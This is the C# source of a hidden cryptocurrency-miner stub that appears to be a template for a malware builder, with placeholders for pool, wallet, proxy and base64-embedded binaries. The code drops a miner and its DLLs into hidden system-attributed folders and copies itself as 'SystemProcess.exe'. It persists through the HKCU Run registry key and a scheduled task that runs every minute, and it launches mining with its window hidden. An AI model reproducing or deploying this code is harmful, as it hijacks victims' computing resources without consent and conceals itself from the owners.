using System.IO;
using Microsoft.VisualBasic;
using System.Reflection;
using System.Threading;

namespace System
{
    class Program
    {
        static string _InstallFolder = Path.GetTempPath() + "%random%\\";
        static string _ExePath = _InstallFolder + "%random1%.exe";
        static string libcurl = _InstallFolder + "libcurl-4.dll";
        static string libiconv = _InstallFolder + "libiconv-2.dll";
        static string libidn = _InstallFolder + "libidn-11.dll";
        static string libintl = _InstallFolder + "libintl-8.dll";
        static string libwinpthread = _InstallFolder + "libwinpthread-1.dll";
        static string zlib1 = _InstallFolder + "zlib1.dll";

        static string _ExePathB64 = "%exeb%";
        static string libcurlB64 = "%libcurl%";
        static string libiconvB64 = "%libiconv%";
        static string libidnB64 = "%libidn%";
        static string libintlB64 = "%libintl%";
        static string libwinpthreadB64 = "%libwinpthread%";
        static string zlib1B64 = "%zlib1%";

        static string startupdir = Path.GetPathRoot(Assembly.GetEntryAssembly().Location) + "Users\\" + Environment.UserName + "\\AppData\\Local\\%random2%";

        static void Main(string[] args)
        {
            Mutex mutex = null;

            const string appName = "%mutex%";
            bool createdNew;

            mutex = new Mutex(true, appName, out createdNew);

            if (!createdNew)
            {

                return;
            }

            %Startup();%
            %Persistence();%
            InstallMiner();
            StartMiner("%pool%", "%user%", "%password%", "%algo%", %threads%);
        }

        static void StartMiner(string pool, string user, string password, string algo, int thread)
        {
            string CPU = " -o " + pool + " -u " + user + " -p " + password + " -a " + algo + " -t " + thread + " -x %proxy%";
            Interaction.Shell(_ExePath + CPU, AppWinStyle.%silentmode%, true);

        }

        static void Persistence()
        {
            Interaction.Shell("schtasks.exe /create /tn %random% /tr " + startupdir + "\\SystemProcess.exe /sc minute /mo 1", AppWinStyle.Hide);
        }

        static void Startup()
        {
            
            if(!Directory.Exists(startupdir))
            {
                Directory.CreateDirectory(startupdir);
                File.SetAttributes(startupdir, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Hidden);
                File.Copy(Assembly.GetEntryAssembly().Location, startupdir + "\\SystemProcess.exe");
                File.SetAttributes(startupdir + "\\SystemProcess.exe", FileAttributes.Hidden | FileAttributes.System | FileAttributes.Hidden);
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("%random3%", startupdir + "\\SystemProcess.exe");
            }
        }

        static void InstallMiner()
        {
            if (Directory.Exists(_InstallFolder))
            {
                Directory.Delete(_InstallFolder, true);
            }

            Directory.CreateDirectory(_InstallFolder);

            File.WriteAllBytes(_ExePath, Convert.FromBase64String(_ExePathB64));
            File.WriteAllBytes(libcurl, Convert.FromBase64String(libcurlB64));
            File.WriteAllBytes(libiconv, Convert.FromBase64String(libiconvB64));
            File.WriteAllBytes(libidn, Convert.FromBase64String(libidnB64));
            File.WriteAllBytes(libintl, Convert.FromBase64String(libintlB64));
            File.WriteAllBytes(libwinpthread, Convert.FromBase64String(libwinpthreadB64));
            File.WriteAllBytes(zlib1, Convert.FromBase64String(zlib1B64));

            File.SetAttributes(_InstallFolder, FileAttributes.Hidden | FileAttributes.System);
            File.SetAttributes(_ExePath, FileAttributes.Hidden | FileAttributes.System);
            File.SetAttributes(libcurl, FileAttributes.Hidden | FileAttributes.System);
            File.SetAttributes(libiconv, FileAttributes.Hidden | FileAttributes.System);
            File.SetAttributes(libidn, FileAttributes.Hidden | FileAttributes.System);
            File.SetAttributes(libintl, FileAttributes.Hidden | FileAttributes.System);
            File.SetAttributes(libwinpthread, FileAttributes.Hidden | FileAttributes.System);
            File.SetAttributes(zlib1, FileAttributes.Hidden | FileAttributes.System);

        }
    }
}